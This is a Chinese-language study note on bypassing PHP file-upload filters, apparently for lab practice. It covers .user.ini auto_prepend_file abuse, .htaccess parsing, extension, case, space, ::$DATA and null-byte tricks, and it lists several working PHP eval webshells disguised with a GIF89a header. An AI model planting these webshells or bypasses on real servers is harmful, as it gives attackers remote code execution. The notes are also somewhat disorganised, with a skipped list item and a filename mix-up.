---
title: 文件上传：从绕过到 user.ini
date: 2026-11-22 08:05:00
author: Xendr1a
categories: [Web安全, Web基础]
tags: [文件上传, WebShell, PHP]
description: 文件上传的常见绕过思路、user.ini 利用与常用木马。
toc: true
---

整理上传点判断、后缀/Content-Type/文件头绕过、解析漏洞、user.ini 与 .htaccess，以及常用免杀木马。

## .user.ini

.user.ini是什么

.user.ini 文件是 PHP 中用于配置特定目录的设置的特殊文件。它类似于 Apache 服务器中的 .htaccess 文件，但仅适用于 PHP。.user.ini 文件允许用户为特定目录定义 PHP 配置指令，这些配置指令将在该目录及其所有子目录中的 PHP 脚本执行时生效。

利用

在PHP环境中，.user.ini 文件与 .htaccess 文件类似，可以用来配置某些 PHP 环境 settings。当PHP.ini中的 user_ini.filename 和 user_ini.cache_ttl 被启用时，PHP会尝试在每个目录下查找并解析.user.ini文件。如果攻击者能够上传一个恶意的.user.ini文件到 PHP 服务器上，他们可能会利用这个文件来改变服务器的配置，例如修改auto_prepend_file或者auto_append_file设置，从而在服务器执行任意代码。

例如，攻击者可能会在一个上传目录中放置一个.user.ini文件，内容如下：

auto_prepend_file=shell.jpg    //其中shell.jpg需要与你上传的文件名相同  
如果服务器上的 PHP 没有正确配置，那么每当有 PHP 文件在这个目录下被访问时，evil.php 中的代码就会被首先执行，这可能会被用来执行恶意操作。

## 常用木马

```text
<?php @eval($_POST['1']);?>
```

```text
<?php
@eval($_POST['x']);
phpinfo();
?>
```

```text
GIF89a
<script language="php">eval($_POST['v'])</script>
```

```text
GIF89a
<?=eval($_REQUEST['cmd']);?>
```

## 文件上传

建议去buu的Upload-Labs-Linux去练习

**（没过滤就可以用**

row

1      $.htaccess文件解析漏洞$

以将所有的文件解析成php文件进行运行

大佬的理解：不让带熟食进去吃，就带原料进去做好了再吃

### 2    可以用特殊后缀，比如php2、php3php4

3     后缀名大小写绕过

4     空格绕过

6    特殊字符::\$DATA绕过

7

8    php不常用后缀名，，，例如.phtml等

### 00截断

当 PHP 在处理文件名或路径时，如果遇到 URL 编码的 %00，它会被解释为一个空字节（ASCII 值为 0）。在php5.3以前，PHP 会将这个空字节转换为 \000 的形式。

而恰恰在php5.3以前，文件名出现\0000,会导致文件名被截断，只保留%00之前的部分。这样的情况可能会导致文件被保存到一个意外的位置，从而产生安全风险

这是因为php语言的底层是c语言，而\0在c语言中是字符串的结束符，所以导致00截断的发生

###### 二、php环境00截断的条件

- php版本小于5.3.29
- magic_quotes_gpc = Off

<?被禁用后   可用<script language='php'>eval($_POST['cmd']);</script>

**PHP 5.x 及更早版本**

- `&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;` 是合法的 PHP 标签，但极少被使用。

##
